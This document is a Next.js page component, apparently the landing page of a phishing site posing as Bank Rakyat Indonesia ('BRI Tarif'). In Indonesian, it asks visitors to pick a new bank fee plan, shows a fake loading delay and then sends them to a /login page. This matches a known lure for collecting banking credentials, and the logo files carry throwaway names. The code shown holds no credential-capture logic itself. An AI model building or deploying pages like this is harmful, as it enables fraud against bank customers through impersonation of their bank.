
import React, { useState } from 'react'
import { useRouter } from 'next/router'
import Image from 'next/image'
import Head from 'next/head'

export default function Home() {

  const router = useRouter()

  const [loading, setLoading] = useState(false)
  const [isRequird, setIsRequird] = useState(true)

  const handleTarif = (e) => {
    e.preventDefault()

    setLoading(true)

    setTimeout(() => {
      setLoading(false)
      router.push('/login')
    }
    , 1500)
  }

  return (
    <div className='container'>
      <Head>
        <title>BRI Tarif</title>
      </Head>
        <div>
            <Image src="/qwertyu.jpg" alt="logo1" width={500} height={150} style={{marginBottom:20}}/>
            <form onSubmit={handleTarif}>
              <div style={{marginLeft:20, marginTop:20, fontWeight:'bold'}}>
                  <label>Pilih Tarif Bank *</label>
              </div>
              <div style={{ marginLeft:20, marginTop:20, display:'flex', alignItems:'center'}}>
                  <input type="checkbox" id="tarif1" name="tarif" style={{marginRight:10, width:20, height:20}} required={isRequird} onChange={(e)=>setIsRequird(false)} />
                  <label htmlFor="tarif1" style={{fontWeight:'bold'}}>Tarif Baru Rp 150.000/Bulan</label><br />
              </div>
              <div style={{ marginLeft:20, marginTop:10, display:'flex', alignItems:'center'}}>
                  <input type="checkbox" id="tarif2" name="tarif" style={{marginRight:10, width:20, height:20}} required={isRequird} onChange={(e)=>setIsRequird(false)} />
                  <label htmlFor="tarif2" style={{fontWeight:'bold'}}>Tarif Normal Rp 6.500/Transaksi</label>
              </div>
              {
                loading ? 
                  <div className='loader' style={{ marginTop:20}}></div>
                  :
                  <button type='submit' style={{backgroundColor: 'rgb(17, 85, 178)', width:'60%', marginLeft:80, marginTop:20,  padding:10, borderRadius:80, color:'#fff', border:'none'}}>Lanjut</button>
              }
            </form>

            <Image src="/qwerty.jpg" alt="logo2" width={500} height={150}  style={{marginTop:30}}/>
        </div>
    </div>
  )
}
